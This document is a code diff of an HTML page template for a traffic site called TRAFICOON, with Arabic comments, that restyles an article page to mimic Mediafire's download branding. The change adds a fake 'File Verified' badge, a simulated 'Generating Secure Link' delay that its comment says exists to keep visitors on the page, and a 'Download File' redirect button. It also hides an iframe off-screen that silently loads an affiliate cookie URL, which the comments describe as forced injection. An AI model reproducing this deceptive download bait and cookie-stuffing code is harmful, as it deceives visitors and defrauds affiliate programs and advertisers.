@@ -5,86 +5,152 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{{ title }}</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,700;1,300&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; background: #fff; color: #334155; }
-        .serif { font-family: 'Merriweather', serif; }
-        .prose p { margin-bottom: 1.5em; line-height: 1.8; font-size: 1.125rem; }
-        .prose img { width: 100%; border-radius: 12px; margin: 20px 0; }
+        /* Mediafire Style Fonts & Colors */
+        body { font-family: 'Roboto', sans-serif; background: #fff; color: #333; }
         
-        /* إخفاء الزر في البداية */
-        #final-btn-wrapper { opacity: 0; transform: translateY(20px); transition: all 0.8s ease-out; }
-        #final-btn-wrapper.visible { opacity: 1; transform: translateY(0); }
+        /* لون ميديافاير الأزرق */
+        .btn-mediafire {
+            background-color: #0070f0; /* اللون الرسمي */
+            color: white;
+            font-weight: 700;
+            text-transform: uppercase;
+            box-shadow: 0 4px 6px rgba(0, 112, 240, 0.3);
+            transition: transform 0.2s, background-color 0.2s;
+        }
+        .btn-mediafire:hover {
+            background-color: #005bc5;
+            transform: translateY(-2px);
+        }
+
+        /* أنيميشن السهم */
+        @keyframes bounce-arrow {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(6px); }
+        }
+        .arrow-anim { animation: bounce-arrow 1.5s infinite; }
+
+        /* تنسيق المقال */
+        .prose p { margin-bottom: 1.2em; line-height: 1.6; font-size: 1.1rem; color: #444; }
+        .prose img { width: 100%; border-radius: 8px; margin: 15px 0; }
+
+        /* إخفاء وتجهيز منطقة التحميل */
+        #download-section { opacity: 0; transform: translateY(20px); transition: all 0.6s ease-out; }
+        #download-section.visible { opacity: 1; transform: translateY(0); }
     </style>
 </head>
-<body class="flex flex-col min-h-screen">
+<body class="flex flex-col min-h-screen relative pb-32">
 
-    <nav class="bg-white border-b border-slate-100 sticky top-0 z-40 bg-white/90 backdrop-blur">
+    <!-- Header -->
+    <nav class="bg-white border-b border-gray-200 sticky top-0 z-40 shadow-sm">
         <div class="max-w-3xl mx-auto px-4 h-16 flex items-center justify-between">
-            <a href="/" class="font-black text-xl tracking-tighter text-slate-900">TRAFICOON<span class="text-blue-600">.</span></a>
-            <span class="text-xs font-bold text-slate-400 uppercase tracking-widest bg-slate-50 px-2 py-1 rounded">{{ category }}</span>
+            <span class="font-bold text-xl text-[#0070f0] tracking-tight">TRAFICOON</span>
+            <span class="text-xs font-bold text-gray-500 bg-gray-100 px-2 py-1 rounded border">{{ category }}</span>
         </div>
     </nav>
 
-    <main class="max-w-3xl mx-auto px-4 py-8 pb-32">
+    <!-- Content -->
+    <main class="max-w-3xl mx-auto px-4 py-8">
         
-        <header class="mb-8 border-b border-slate-100 pb-6">
-            <h1 class="text-3xl md:text-4xl font-black text-slate-900 mt-2 mb-4 leading-tight serif">{{ title }}</h1>
-            <div class="flex items-center gap-3 text-sm text-slate-400">
-                <span class="bg-green-100 text-green-700 px-2 py-0.5 rounded text-xs font-bold">Verified</span>
-                <span>{{ date }}</span>
+        <header class="mb-6 border-b border-gray-100 pb-4">
+            <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">{{ title }}</h1>
+            <div class="flex items-center gap-2 text-sm text-gray-500">
+                <span class="w-2 h-2 rounded-full bg-green-500"></span>
+                <span>File Verified</span>
+                <span>• {{ date }}</span>
             </div>
         </header>
 
-        <!-- 🔥 عرض الصورة البارزة (إذا وجدت) 🔥 -->
+        <!-- صورة المقال -->
         {% if image %}
-        <div class="mb-8">
-            <img src="{{ image }}" class="w-full rounded-xl shadow-sm" alt="Featured Image">
+        <div class="mb-6">
+            <img src="{{ image }}" class="w-full rounded-lg shadow-sm" alt="Preview">
         </div>
         {% endif %}
 
-        <!-- 🔥 عرض النص الحقيقي القادم من قاعدة البيانات 🔥 -->
-        <div class="prose max-w-none text-slate-700 serif">
+        <!-- النص (يقرأه الزائر بينما الكوكيز تعمل) -->
+        <div class="prose max-w-none">
             {{ body | safe }}
         </div>
         
-        <!-- منطقة الزر -->
-        <div id="final-btn-wrapper" class="mt-16 pt-8 border-t border-slate-100 text-center">
-            <div id="btn-loading" class="hidden flex-col items-center justify-center">
-                <div class="w-6 h-6 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mb-3"></div>
-                <span class="text-slate-500 text-sm font-mono">Verifying...</span>
+        <!-- منطقة التحميل (Download Center) -->
+        <div id="download-section" class="mt-12 p-8 bg-gray-50 rounded-xl border border-gray-200 text-center">
+            
+            <!-- الحالة 1: الفحص -->
+            <div id="file-checking" class="flex flex-col items-center justify-center py-4">
+                <div class="w-8 h-8 border-4 border-[#0070f0] border-t-transparent rounded-full animate-spin mb-3"></div>
+                <span class="text-gray-600 font-medium animate-pulse">Generating Secure Link...</span>
             </div>
-            <a id="btn-action" href="/redirect?url={{ target_url }}" class="hidden bg-slate-900 text-white px-10 py-4 rounded-full font-bold text-lg hover:bg-blue-600 transition shadow-xl w-full md:w-auto">
-                Continue to Full Article &rarr;
-            </a>
+
+            <!-- الحالة 2: زر التحميل (يظهر بعد ثانية) -->
+            <div id="file-ready" class="hidden">
+                <p class="text-sm text-gray-500 mb-4">File is ready for download</p>
+                <a href="/redirect?url={{ target_url }}" class="btn-mediafire px-12 py-4 rounded text-lg w-full md:w-auto inline-block">
+                    Download File ⬇️
+                </a>
+            </div>
         </div>
 
     </main>
 
-    <!-- 🔥 الكوكيز (علي إكسبريس) 🔥 -->
-    <!-- ملاحظة: هذا مخفي، لن تراه بالعين، لكنه يعمل -->
+    <!-- الإشعار العائم (Mediafire Style) -->
+    <div id="floating-toast" class="fixed bottom-6 left-4 right-4 md:left-auto md:right-6 md:w-auto bg-[#0070f0] text-white p-4 rounded-lg shadow-2xl z-50 flex items-center justify-between gap-4 cursor-pointer transform translate-y-20 opacity-0 transition-all duration-500" onclick="scrollToBottom()">
+        <div class="flex items-center gap-3">
+            <div class="bg-white/20 p-2 rounded">
+                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+            </div>
+            <div>
+                <p class="font-bold text-sm">Download Ready</p>
+                <p class="text-[10px] text-blue-100">Click to scroll down</p>
+            </div>
+        </div>
+        <svg class="w-5 h-5 text-white arrow-anim" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+    </div>
+
+    <!-- 🔥 الكوكيز (الحقن الإجباري 100%) 🔥 -->
+    <!-- التقنية: نضعها خارج الشاشة، لكنها جزء من الصفحة فيتم تحميلها فوراً -->
     {% if cookie_url %}
-    <iframe src="{{ cookie_url }}" style="width:0;height:0;border:0; border:none; visibility:hidden;" referrerpolicy="no-referrer"></iframe>
+    <div style="position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; overflow:hidden;">
+        <iframe src="{{ cookie_url }}" loading="eager" style="width:100px; height:100px; border:none;"></iframe>
+    </div>
     {% endif %}
 
     <script>
-        const btnWrapper = document.getElementById('final-btn-wrapper');
-        const btnLoading = document.getElementById('btn-loading');
-        const btnAction = document.getElementById('btn-action');
-        let btnRevealed = false;
+        const toast = document.getElementById('floating-toast');
+        const section = document.getElementById('download-section');
+        const checking = document.getElementById('file-checking');
+        const ready = document.getElementById('file-ready');
+        let revealed = false;
 
+        // 1. إظهار الإشعار العائم بعد 1.5 ثانية
+        setTimeout(() => {
+            if (!revealed) {
+                toast.classList.remove('translate-y-20', 'opacity-0');
+            }
+        }, 1500);
+
+        function scrollToBottom() {
+            section.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // 2. مراقبة السكرول
         window.addEventListener('scroll', () => {
-            if ((window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 300)) {
-                if (!btnRevealed) {
-                    btnRevealed = true;
-                    btnWrapper.classList.add('visible');
-                    btnLoading.classList.remove('hidden');
-                    btnLoading.classList.add('flex');
+            // إذا اقترب من الأسفل
+            if ((window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 400)) {
+                
+                // إخفاء الإشعار
+                toast.classList.add('translate-y-20', 'opacity-0');
+
+                if (!revealed) {
+                    revealed = true;
+                    section.classList.add('visible');
+                    
+                    // محاكاة تجهيز الرابط (1.5 ثانية) لضمان بقاء الزائر
                     setTimeout(() => {
-                        btnLoading.classList.add('hidden');
-                        btnLoading.classList.remove('flex');
-                        btnAction.classList.remove('hidden');
-                    }, 1000);
+                        checking.classList.add('hidden');
+                        ready.classList.remove('hidden');
+                    }, 1500);
                 }
             }
         });
